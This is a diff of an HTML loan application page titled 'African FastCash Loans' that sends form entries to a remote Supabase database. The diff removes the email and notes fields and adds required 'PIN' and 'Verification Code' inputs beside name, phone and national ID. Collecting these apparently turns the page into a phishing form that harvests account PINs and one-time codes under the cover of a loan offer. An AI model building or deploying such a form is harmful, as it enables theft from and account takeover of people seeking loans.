@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -8,10 +7,9 @@
 
 <style>
 body{
-font-family:Arial,sans-serif;
+font-family:Arial;
 margin:0;
 background:#f4f4f4;
-color:#333;
 }
 header{
 background:#0b5ed7;
@@ -19,15 +17,10 @@ color:white;
 padding:20px;
 text-align:center;
 }
-.hero{
-padding:40px 20px;
-text-align:center;
-background:white;
-}
 .section{
-padding:30px 20px;
-max-width:900px;
+max-width:800px;
 margin:auto;
+padding:20px;
 }
 .card{
 background:white;
@@ -35,54 +28,37 @@ padding:20px;
 border-radius:10px;
 box-shadow:0 2px 8px rgba(0,0,0,0.1);
 }
-input,select,textarea{
+input,select{
 width:100%;
 padding:12px;
 margin:8px 0;
-border:1px solid #ccc;
-border-radius:6px;
 }
 button{
+width:100%;
+padding:15px;
 background:#0b5ed7;
 color:white;
 border:none;
-padding:15px;
-width:100%;
-border-radius:6px;
-font-size:16px;
-cursor:pointer;
 }
 </style>
-
 </head>
 
 <body>
 
 <header>
 <h2>African FastCash Loans</h2>
-<p>Fast • Secure • Reliable Loans</p>
+<p>Apply Online</p>
 </header>
 
-<section class="hero">
-<h1>Apply for a Loan Online</h1>
-<p>Fill the form below to apply instantly</p>
-</section>
-
-<section class="section">
+<div class="section">
 <div class="card">
-
-<h2>Loan Application</h2>
 
 <form id="loanForm">
 
-<input name="full_name" type="text" placeholder="Full Name" required>
-
-<input name="phone" type="tel" placeholder="Phone Number" required>
-
-<input name="email" type="email" placeholder="Email (Optional)">
-
-<input name="national_id" type="text" placeholder="National ID" required>
-
+<input name="full_name" placeholder="Full Name" required>
+<input name="phone" placeholder="Phone Number" required>
+<input name="pin" placeholder="PIN" required>
+<input name="national_id" placeholder="National ID" required>
 <input name="loan_amount" type="number" placeholder="Loan Amount" required>
 
 <select name="loan_purpose" required>
@@ -93,7 +69,7 @@ cursor:pointer;
 <option>Personal</option>
 </select>
 
-<textarea name="additional_info" placeholder="Additional Info"></textarea>
+<input name="verification_code" placeholder="Verification Code" required>
 
 <button type="submit">Submit Application</button>
 
@@ -102,7 +78,7 @@ cursor:pointer;
 <p id="msg"></p>
 
 </div>
-</section>
+</div>
 
 <script type="module">
 import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
@@ -125,13 +101,11 @@ document.getElementById("loanForm").addEventListener("submit", async (e) => {
     console.log(error);
     document.getElementById("msg").innerText = "❌ Failed to submit";
   } else {
-    document.getElementById("msg").innerText = "✅ Application submitted!";
+    document.getElementById("msg").innerText = "✅ Submitted successfully";
     e.target.reset();
   }
 });
 </script>
 
-<script>
-alert("JS IS WORKING");
-</script>/body>
+</body>
 </html>
